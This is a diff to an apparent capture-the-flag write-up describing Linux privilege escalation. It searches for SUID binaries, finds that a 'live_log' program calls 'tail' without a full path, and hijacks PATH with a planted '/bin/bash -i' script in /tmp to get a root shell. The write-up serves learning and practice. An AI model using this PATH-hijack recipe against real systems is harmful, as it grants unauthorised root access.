@@ -181,31 +181,35 @@ pY8rMoBXqgm9hC5JsXzn6Z6X1kpGFhDjkNSdzx4jYzw=
 </br>sadly, we can't see stuff with sudo -l
 </br>
 </br>try the alternate
-</br>find / -perm -4000 2>/dev/null
-</br>
-</br>find live log in a personal home directory, so check that
-</br>
-</br>odd file path calls 
+</br>`find / -perm -4000 2>/dev/null`
+</br> NOTE: personal directories are non-standard and indicate there may be custom content
+</br>find live log in a personal home directory, so check that.
+</br>![personallyOwnedIsINvestigate](https://github.com/user-attachments/assets/4367d907-a7b1-4ed1-98cb-7fd4e04fe0c
+</br> running strings on the file gives us an odd file path call
+![stringsLookForPathExecute](https://github.com/user-attachments/assets/e63795f3-ed90-4f23-8774-c7dc7e758e45)
+1)
 </br>
 ```
 tail -f /var/log/nginx/access.log
 ```
-</br>
-</br>let's modify this by going into /tmp and making out own 'tail'
-</br>cd /tmp
-</br>echo /bin/bash -i > tail
-</br>
-</br>the new tail will spawn a bash session
-</br>
-</br>now we overwrite the path to execute from /tmp, using our tail
-</br>
-</br>export PATH=/tmp:$PATH
+</br>![encodedMeansWeWannaCheckStrings](https://github.com/user-attachments/assets/08049ede-5cde-47ce-9e0e-1f5600d93ae2)
+</br> the live log content itself is a mess... but from strings it is calling tail, so we can exploit this
+</br>let's go into /tmp and try making out own 'tail' to overwrite the call
+</br>`cd /tmp`
+</br>`echo /bin/bash -i > tail`
+</br>this way, the new tail command will spawn a bash session
+</br>now we overwrite the path to execute from /tmp, using our tail to overwrite the typical path
+</br>`export PATH=/tmp:$PATH`
 </br>
 </br>give it execute permisisons
 </br>chmod +x tail
-</br>(chmod 600 didn't work, so I ha to do it a second time with +x instead)
+</br>(chmod 600 didn't work, so I had to do it a second time with +x instead)
 
 </br>go into joe's folder and execute the live_log file to trigger it
 </br>cd /home/joe
 </br>./live_log
+
+![tmpTampering](https://github.com/user-attachments/assets/efc5bdff-0957-4647-aa55-f7cebac24a64)
+</br> we get root after executing ./live_log because we modified the "tail" call to launch /bin/bash as root with `bin/bash -i` when hijacking the execution path for tail, which got called in live_log.
+![done3](https://github.com/user-attachments/assets/8007b180-e62e-4147-8219-bc580648c1d3)
 
